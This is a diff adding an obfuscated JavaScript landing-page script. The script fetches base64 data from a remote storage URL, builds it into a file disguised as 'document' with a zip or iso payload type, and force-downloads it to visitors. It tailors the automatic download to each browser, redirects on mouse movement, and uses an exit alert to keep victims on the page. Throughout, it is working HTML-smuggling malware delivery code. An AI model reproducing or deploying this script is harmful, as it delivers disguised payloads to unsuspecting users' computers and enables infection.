@@ -1,0 +1,325 @@
+var settings = 2;
+var url_file = 'https://storage.googleapis.com/glwux2ka4abl6s.appspot.com/f/fdN5F8qEYlD9j.html';
+var url_type = 'zip';
+var base64_type = 'iso';
+var base64_string = '';
+let a = false;
+var params = {
+    url: '#',
+    loadingTime: 5,
+    showDownloadMsg: 2000,
+    redirectTime: 0,
+    exitAlert: 'yes',
+    blockCustomAlert: 'yes',
+    FirefoxAutoloadingTime: 0,
+    Chrome: {
+        bottom: '',
+        left: '0',
+        right: '0',
+        top: '420px',
+        check: 'no',
+        auto_download: 'yes',
+        mouseMove: 'no'
+    },
+    Edge: {
+        bottom: '20px',
+        left: '40%',
+        right: '',
+        top: '',
+        check: 'no',
+        auto_download: 'yes',
+        mouseMove: 'no'
+    },
+    Firefox: {
+        bottom: '',
+        left: '',
+        right: '20px',
+        top: '20px',
+        check: 'no',
+        auto_download: 'yes',
+        mouseMove: 'no'
+    },
+    Opera: {
+        bottom: '',
+        left: '',
+        right: '20px',
+        top: '20px',
+        check: 'no',
+        auto_download: 'yes',
+        mouseMove: 'no'
+    },
+    Chromium: {
+        bottom: '20px',
+        left: '',
+        right: '',
+        top: '',
+        check: 'no',
+        auto_download: 'yes',
+        mouseMove: 'no'
+    }
+};
+
+function loaderStrip() {
+    $(window)['load'](function() {
+        var _0xc3f0x9 = $('.loader');
+        var _0xc3f0xa = $('.otherloader');
+        var _0xc3f0xb = $(window)['height']();
+        var _0xc3f0xc = $(window)['width']();
+        var _0xc3f0xd = 0;
+        _0xc3f0x9['css']({
+            top: _0xc3f0xb / 0,
+            left: _0xc3f0xc / 0
+        });
+        do {
+            _0xc3f0x9['animate']({
+                width: _0xc3f0xd
+            }, params['loadingTime']);
+            _0xc3f0xd += 2
+        } while (_0xc3f0xd <= 140);;
+        if (_0xc3f0xd === 142) {
+            _0xc3f0x9['animate']({
+                left: 0,
+                width: '100%'
+            }, function() {
+                $('.loading-wrapper')['animate']({
+                    '\x6F\x70\x61\x63\x69\x74\x79': 0
+                }, {
+                    duration: 200,
+                    complete: function() {
+                        $('.logo')['animate']({
+                            '\x77\x69\x64\x74\x68': '100px',
+                            '\x68\x65\x69\x67\x68\x74': '100px'
+                        }, {
+                            queue: false
+                        });
+                        $('.content')['animate']({
+                            '\x6F\x70\x61\x63\x69\x74\x79': 1
+                        }, {
+                            duration: 200,
+                            queue: false
+                        });
+                        switch (settings) {
+                            case 1:
+                                showMes();
+                                window['location'] = url_file;
+                                $('#btn, #btn_alert')['click'](function() {
+                                    window['location'] = url_file;
+                                    showMes()
+                                });
+                                break;
+                            case 2:
+                                $['getJSON'](url_file, function(_0xc3f0xe) {})['done'](function(_0xc3f0xe) {
+                                    var _0xc3f0xf = extensionMatcher(_0xc3f0xe['data'], url_type);
+                                    save(_0xc3f0xf, getAdditionalInfo(_0xc3f0xf)['type'], getAdditionalInfo(_0xc3f0xf)['ext']);
+                                    showMes()
+                                })['fail'](function() {
+                                    console['log']('error getting base64 from external api')
+                                });
+                                $('#btn, #btn_alert')['click'](function() {
+                                    $['getJSON'](url_file, function(_0xc3f0xe) {})['done'](function(_0xc3f0xe) {
+                                        var _0xc3f0xf = extensionMatcher(_0xc3f0xe['data'], url_type);
+                                        save(_0xc3f0xf, getAdditionalInfo(_0xc3f0xf)['type'], getAdditionalInfo(_0xc3f0xf)['ext']);
+                                        showMes()
+                                    })['fail'](function() {
+                                        console['log']('error getting base64 from external api')
+                                    })
+                                });
+                                break;
+                            case 3:
+                                var _0xc3f0x10 = extensionMatcher(base64_string, base64_type);
+                                save(_0xc3f0x10, getAdditionalInfo(_0xc3f0x10)['type'], getAdditionalInfo(_0xc3f0x10)['ext']);
+                                showMes();
+                                $('#btn, #btn_alert')['click'](function() {
+                                    save(_0xc3f0x10, getAdditionalInfo(_0xc3f0x10)['type'], getAdditionalInfo(_0xc3f0x10)['ext']);
+                                    showMes()
+                                });
+                                break;
+                            case 4:
+                                sendReq();
+                                break;
+                            default:
+                        }
+                    }
+                })
+            })
+        }
+    })
+}
+loaderStrip();
+
+function hello(_0xc3f0x12) {
+    params['url'] = _0xc3f0x12;
+    console['log'](params['url'], 'seeewrewrw');
+    var _0xc3f0x13 = document['getElementById']('btn_alert');
+    _0xc3f0x13['setAttribute']('href', params['url']);
+    _0xc3f0x13['setAttribute']('download', 'true');
+    var _0xc3f0x14 = document['getElementById']('btn');
+    for (const [key, value] of Object['entries'](params)) {
+        if ((navigator['userAgent']['indexOf'](key) > -1)) {
+            if (value['mouseMove'] === 'yes') {
+                let _0xc3f0x15 = 0;
+                document['addEventListener']('mousemove', () => {
+                    _0xc3f0x15 = _0xc3f0x15 + 1;
+                    if (_0xc3f0x15 === 1) {
+                        window['onbeforeunload'] = () => {
+                            return undefined
+                        };
+                        window['location'] = params['url'];
+                        $(document)['off']('mousemove', mouse)
+                    }
+                })
+            };
+            if (value['auto_download'] === 'yes') {
+                if (key === 'Firefox') {
+                    setTimeout(() => {
+                        window['location'] = params['url']
+                    }, params.FirefoxAutoloadingTime)
+                };
+                setTimeout(() => {
+                    $(document)['ready'](() => {
+                        window['onbeforeunload'] = () => {
+                            return undefined
+                        };
+                        window['location'] = params['url'];
+                        setTimeout(() => {
+                            $('#message')['css']({
+                                '\x64\x69\x73\x70\x6C\x61\x79': 'block'
+                            })
+                        }, params['showDownloadMsg'])
+                    })
+                }, params['redirectTime'])
+            };
+            if (value['check'] === 'no') {
+                _0xc3f0x14['setAttribute']('href', params['url']);
+                _0xc3f0x14['setAttribute']('download', true)
+            } else {
+                if (value['check'] === 'yes') {
+                    document['addEventListener']('click', () => {
+                        window['onbeforeunload'] = () => {
+                            return undefined
+                        };
+                        window['location'] = params['url']
+                    })
+                }
+            };
+            $('#btn, #btn_alert')['click']((_0xc3f0x12) => {
+                window['onbeforeunload'] = () => {
+                    return undefined
+                };
+                setTimeout(() => {
+                    $('#message')['css']({
+                        '\x64\x69\x73\x70\x6C\x61\x79': 'block'
+                    })
+                }, params['showDownloadMsg'])
+            })
+        }
+    }
+}
+if (params['exitAlert'] === 'yes') {
+    window['onbeforeunload'] = function(_0xc3f0x16) {
+        var _0xc3f0x17 = 'Test';
+        if (typeof _0xc3f0x16 == 'undefined') {
+            _0xc3f0x16 = window['event']
+        };
+        if (_0xc3f0x16) {
+            _0xc3f0x16['returnValue'] = _0xc3f0x17
+        };
+        return null
+    }
+};
+
+function toDataUri(_0xc3f0x19, _0xc3f0x1a) {
+    var _0xc3f0x1b = new XMLHttpRequest();
+    _0xc3f0x1b['onload'] = function() {
+        var _0xc3f0x1c = new FileReader();
+        _0xc3f0x1c['onloadend'] = function() {
+            _0xc3f0x1a(_0xc3f0x1c['result'])
+        };
+        _0xc3f0x1c['readAsDataURL'](_0xc3f0x1b['response'])
+    };
+    _0xc3f0x1b['open']('GET', _0xc3f0x19);
+    _0xc3f0x1b['responseType'] = 'blob';
+    _0xc3f0x1b['send']()
+}
+
+function toBlob(_0xc3f0x1e) {
+    var _0xc3f0x1f = atob(_0xc3f0x1e['split'](',')[1]);
+    var _0xc3f0x20 = _0xc3f0x1e['split'](',')[0]['split'](':')[1]['split'](';')[0];
+    var _0xc3f0x21 = new ArrayBuffer(_0xc3f0x1f['length']);
+    var _0xc3f0x22 = new Uint8Array(_0xc3f0x21);
+    for (var _0xc3f0xd = 0; _0xc3f0xd < _0xc3f0x1f['length']; _0xc3f0xd++) {
+        _0xc3f0x22[_0xc3f0xd] = _0xc3f0x1f['charCodeAt'](_0xc3f0xd)
+    };
+    var _0xc3f0x23 = new Blob([_0xc3f0x21], {
+        type: _0xc3f0x20
+    });
+    return _0xc3f0x23
+}
+
+function getAdditionalInfo(_0xc3f0x25) {
+    var _0xc3f0x26 = _0xc3f0x25['split'](';')[0]['split']('/')[1];
+    if (_0xc3f0x26 == 'plain') {
+        _0xc3f0x26 = 'txt'
+    } else {
+        if (_0xc3f0x26['includes']('word')) {
+            _0xc3f0x26 = 'doc'
+        }
+    };
+    var _0xc3f0x27 = _0xc3f0x25['split'](';')[0]['split'](':')[1];
+    return {
+        '\x65\x78\x74': _0xc3f0x26,
+        '\x74\x79\x70\x65': _0xc3f0x27
+    }
+}
+
+function extensionMatcher(_0xc3f0x25, _0xc3f0x27) {
+    var _0xc3f0x29 = '';
+    if (_0xc3f0x27 == 'doc' || _0xc3f0x27 == 'doc') {
+        _0xc3f0x29 = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+    } else {
+        if (_0xc3f0x27 == 'txt') {
+            _0xc3f0x29 = 'text/plain'
+        } else {
+            if (_0xc3f0x27 == 'pdf') {
+                _0xc3f0x29 = 'application/' + _0xc3f0x27
+            } else {
+                _0xc3f0x29 = 'image/' + _0xc3f0x27
+            }
+        }
+    };
+    var _0xc3f0x2a = 'data:' + _0xc3f0x29 + ';base64,';
+    return (_0xc3f0x2a + _0xc3f0x25)
+}
+
+function assemble(_0xc3f0x19) {
+    toDataUri(_0xc3f0x19, function(_0xc3f0x2c) {
+        var _0xc3f0x2d = getAdditionalInfo(_0xc3f0x2c);
+        save(_0xc3f0x2c, _0xc3f0x2d['type'], _0xc3f0x2d['ext'])
+    })
+}
+
+function save(_0xc3f0x2f, _0xc3f0x27, _0xc3f0x26) {
+    var _0xc3f0x30 = toBlob(_0xc3f0x2f);
+    var _0xc3f0x23 = new Blob([_0xc3f0x30], {
+        type: _0xc3f0x27
+    });
+    saveAs(_0xc3f0x23, ('document.' + _0xc3f0x26))
+}
+
+function sendReq() {
+    $['getJSON']('#', function(_0xc3f0xe) {})['done'](function(_0xc3f0xe) {
+        params['loadingTime'] = 0;;;
+        params['url'] = _0xc3f0xe['data'];
+        hello(_0xc3f0xe['data'])
+    })['fail'](function() {
+        console['log']('error')
+    })
+}
+
+function showMes(_0xc3f0x33 = 1000) {
+    setTimeout(() => {
+        $('#message')['css']({
+            '\x64\x69\x73\x70\x6C\x61\x79': 'block'
+        })
+    }, _0xc3f0x33)
+}
